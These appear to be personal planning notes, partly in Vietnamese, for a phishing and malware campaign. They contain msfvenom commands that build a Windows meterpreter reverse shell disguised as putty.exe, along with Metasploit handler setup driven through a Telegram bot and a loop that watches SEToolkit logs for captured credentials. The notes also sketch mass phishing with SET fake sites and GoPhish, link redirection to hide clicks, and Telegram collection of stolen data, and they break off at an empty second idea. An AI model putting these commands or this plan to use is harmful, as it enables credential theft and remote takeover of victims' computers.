# METASPLOIT
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o putty.exe

/session send msf  

msfconsole
/session send msf  use exploit/multi/handler
/session send msf  set payload windows/meterpreter/reverse_tcp
/session send msf  set LHOST IP     # hoặc 0.0.0.0 / interface cụ thể nếu máy có nhiều IP
/session send msf  set LPORT 4444
/session send msf  set ExitOnSession false
/session send msf  exploit -j -z





# SET



screen -L -Logfile /tmp/set_output.log setoolkit

while true; do
    tail -n 50 /tmp/set_output.log | grep -E "(POSSIBLE|WE GOT A HIT|GET /)"
    sleep 2
done

python3 set_monitor_fixed.py


dùng telegram để làm gì

+ để control cái SET và Metasploit

Control như nào ? 

- > Dùng tele để điều khiển các hoạt động của SET như 
     + tạo site fake , .,..
     + chạy file get data
- > Dùng tele để điều khiển các tác vụ của metasploit như nào?
     +  dùng lệnh được setup sẵn ở trong telgram , giúp giảm thời gian gõ
     + set LHOST , LPORT bằng tay
     + set malware = tay

vậy làm sao để kết hợp 2 cái này?
giờ mình sẽ đưa ra 2 phương pháp 
1 là tấn công bằng social eng
2 là mình dùng metasploit để tiêm malware vào exe rồi dùng gophish để tấn công nạn nhân , (dùng tele để get lệnh tấn công )

ý tưởng 1 : 
          - SET + GOPHISH , dùng SET để tạo trang fake rồi dùng gophish gửi email tấn công hàng loạt 
          - Tele sẽ get data và cho tải về
Vấn đề : - Làm sao để gophish nó phát hiện là mình đã click vô link? 
Hướng giải quyết : Redirection tới link mình phishing

ý tưởng 2 :
